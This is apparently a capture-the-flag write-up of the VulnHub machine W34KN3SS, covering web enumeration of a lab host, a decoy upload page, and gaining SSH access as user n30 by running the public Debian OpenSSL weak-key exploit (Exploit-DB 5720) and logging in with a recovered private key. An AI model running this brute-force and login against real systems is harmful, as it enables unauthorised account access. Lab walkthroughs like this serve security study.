# Web Service
[05 - Ports Scan & Enumeration](05%20-%20Ports%20Scan%20&%20Enumeration.md)
- /uploads folder is empty, but we should have at least rw permission on it.
- /upload.php is file upload function.
- /test:    it's all about keys
- /blog is listable empty folder

## /upload.php
- after I made an sh3ll.php and try to upload, I got this:
![](Pasted%20image%2020210425165632.png)
- the code says
```bash
echo 'V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE' | base64 -d

WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D
```

- Check the source page, not everything I saw was real? Upload is just an illusion?
![](Pasted%20image%2020210425165848.png)

- Copy and checked this b64 coded jpg found nothing interesting
```bash
┌[ChanninNicosMBP]─[16:54-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ vim matrix

┌[ChanninNicosMBP]─[17:02-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ mv matrix matrix_b64

┌[ChanninNicosMBP]─[17:02-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ cat matrix_b64 | base64 -d > matrix

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ file matrix
matrix: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 800x600, components 3

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ mv matrix matrix.jpg

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ exiftool matrix.jpg
ExifTool Version Number         : 12.16
File Name                       : matrix.jpg
Directory                       : .
File Size                       : 175 KiB
File Modification Date/Time     : 2021:04:25 17:03:07+08:00
File Access Date/Time           : 2021:04:25 17:03:19+08:00
File Inode Change Date/Time     : 2021:04:25 17:03:17+08:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 800
Image Height                    : 600
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x600
Megapixels                      : 0.480

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ binwalk matrix.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```


## weakness.jth
- Alright, after a little bit struglling, I recall that I access all the web pages by ip address, but I did find hostname. 
![](Pasted%20image%2020210425172936.png)
- So I scanned web site by http://weakness.jth, and I do find something
```bash
gobuster dir -u http://weakness.jth/ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://weakness.jth/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              htm,html,php,asp,aspx,jsp,txt
[+] Timeout:                 10s
===============================================================
2021/04/25 17:30:33 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 526]
/private              (Status: 301) [Size: 314] [--> http://weakness.jth/private/]
/robots.txt           (Status: 200) [Size: 14]
/server-status        (Status: 403) [Size: 300]

===============================================================
2021/04/25 17:40:10 Finished
===============================================================
```

- /robots.txt says `Forget it!`, OK.
- /private do give us some juice.
![](Pasted%20image%2020210425173534.png)
```bash
┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/mykey.pub                                               130 ⨯
--2021-04-25 17:36:21--  http://weakness.jth/private/mykey.pub
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2021-04-25 17:36:21 ERROR 404: Not Found.


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/files/mykey.pub                                           8 ⨯
--2021-04-25 17:36:41--  http://weakness.jth/private/files/mykey.pub
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 400
Saving to: ‘mykey.pub’

mykey.pub                 100%[==================================>]     400  --.-KB/s    in 0s

2021-04-25 17:36:41 (42.4 MB/s) - ‘mykey.pub’ saved [400/400]


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/files/notes.txt
--2021-04-25 17:36:53--  http://weakness.jth/private/files/notes.txt
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43 [text/plain]
Saving to: ‘notes.txt’

notes.txt                 100%[==================================>]      43  --.-KB/s    in 0s

2021-04-25 17:36:53 (2.05 MB/s) - ‘notes.txt’ saved [43/43]


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ cat notes.txt
this key was generated by openssl 0.9.8c-1
```

- This matches the clue about "keys", now we have the key of specific version, should have some exploit.
	- https://www.exploit-db.com/exploits/5720
	- since this exploit did request a valid username, and then I recall I did have one from the mailbox: `n30`
```bash
┌[ChanninNicosMBP]─[18:01-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh 192.168.20.6                                                                         130 ⨯
The authenticity of host '192.168.20.6 (192.168.20.6)' can't be established.
ECDSA key fingerprint is SHA256:FTdaO229JeXut53RKWWYP4l8cnqYel7GvYcdUsCXAqQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.20.6' (ECDSA) to the list of known hosts.
cn@192.168.20.6's password:


┌[ChanninNicosMBP]─[18:01-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ python2 5720.py rsa/2048/ 192.168.20.6 n30 22 5                                          130 ⨯

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 204 keys | Remaining 32564 keys | Aprox. Speed 40/sec
Tested 400 keys | Remaining 32368 keys | Aprox. Speed 39/sec
...[snip]...
Tested 16026 keys | Remaining 16742 keys | Aprox. Speed 38/sec
Tested 16183 keys | Remaining 16585 keys | Aprox. Speed 31/sec

Key Found in file: 58df9e40959666346f106e21cc1909a2-11625
Execute: ssh -ln30 -p22 -i rsa/2048//58df9e40959666346f106e21cc1909a2-11625 192.168.20.6


Key Found in file: 53f652c0380c9d4e1752a115a76eab55-6522
Execute: ssh -ln30 -p22 -i rsa/2048//53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6


Key Found in file: 055c9ab9822f2b9e130983cdcea829c0-23107
Execute: ssh -ln30 -p22 -i rsa/2048//055c9ab9822f2b9e130983cdcea829c0-23107 192.168.20.6


Key Found in file: 7b6f41a1e259dd03476d45c1d0c99032-29490
Execute: ssh -ln30 -p22 -i rsa/2048//7b6f41a1e259dd03476d45c1d0c99032-29490 192.168.20.6


Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6

Tested 16183 keys | Remaining 16585 keys | Aprox. Speed 0/sec
```

- Wow, and it worked like magic
```bash
┌[ChanninNicosMBP]─[18:08-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048//53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~$ id
uid=1000(n30) gid=1000(n30) groups=1000(n30),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

- And one more interesting thing is the keys exploit will change after victim host reboot, so it will request another 5720 attack to get the pub keys.
```bash
...[victim host reboot]...

┌[ChanningNicos-MacBook-Pro]─[13:58-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048/53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6
n30@192.168.20.6's password:


┌[ChanningNicos-MacBook-Pro]─[13:58-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ python2 5720.py rsa/2048/ 192.168.20.6 n30 22 5                                                                                                                                                 130 ⨯

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 201 keys | Remaining 32567 keys | Aprox. Speed 40/sec
Tested 400 keys | Remaining 32368 keys | Aprox. Speed 39/sec
...[snip]...
Key Found in file: 055c9ab9822f2b9e130983cdcea829c0-23107
Execute: ssh -ln30 -p22 -i rsa/2048//055c9ab9822f2b9e130983cdcea829c0-23107 192.168.20.6


Key Found in file: 58df9e40959666346f106e21cc1909a2-11625
Execute: ssh -ln30 -p22 -i rsa/2048//58df9e40959666346f106e21cc1909a2-11625 192.168.20.6


Key Found in file: 176673da90604f5f37de99f10a41de57-27079
Execute: ssh -ln30 -p22 -i rsa/2048//176673da90604f5f37de99f10a41de57-27079 192.168.20.6


Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6


Key Found in file: 2e62e82a5bcee03b421fa58f8de407b2-28072
Execute: ssh -ln30 -p22 -i rsa/2048//2e62e82a5bcee03b421fa58f8de407b2-28072 192.168.20.6

Tested 16185 keys | Remaining 16583 keys | Aprox. Speed 10/sec

┌[ChanningNicos-MacBook-Pro]─[14:06-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr 25 22:28:44 2021 from 192.168.20.1
n30@W34KN3SS:~$
```

